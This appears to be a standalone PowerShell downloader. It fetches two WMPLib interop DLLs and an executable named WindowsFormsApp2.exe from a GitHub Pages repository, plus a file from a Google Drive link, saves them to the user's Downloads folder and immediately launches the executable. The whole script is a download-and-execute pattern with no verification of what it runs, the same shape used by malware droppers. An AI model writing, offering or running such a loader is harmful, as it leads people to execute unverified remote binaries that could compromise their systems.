$urls = @(
    "https://github.com/webntdev/webntdev.github.io/raw/main/application/AxInterop.WMPLib.dll",
    "https://github.com/webntdev/webntdev.github.io/raw/main/application/Interop.WMPLib.dll",
    "https://drive.usercontent.google.com/download?id=1P1IQxa4Wu7oS4AyQ1EGM5sjlygk_GDCA&export=download&authuser=0&confirm=t&uuid=1a34b49c-95fd-4cf0-a211-7d752c30aa58&at=APZUnTXtv0b3jmq1lze6zoU0TbTr%3A1712653224494",
    "https://github.com/webntdev/webntdev.github.io/raw/main/application/WindowsFormsApp2.exe"
)

$downloadDir = [System.Environment]::ExpandEnvironmentVariables('%USERPROFILE%\Downloads')
if (-not (Test-Path -Path $downloadDir)) {
    New-Item -ItemType Directory -Path $downloadDir
}

foreach ($url in $urls) {
    $fileName = [System.IO.Path]::GetFileName($url)
    $destinationPath = Join-Path -Path $downloadDir -ChildPath $fileName
    Invoke-WebRequest -Uri $url -OutFile $destinationPath
}

$exePath = Join-Path -Path $downloadDir -ChildPath "WindowsFormsApp2.exe"
Start-Process -FilePath $exePath
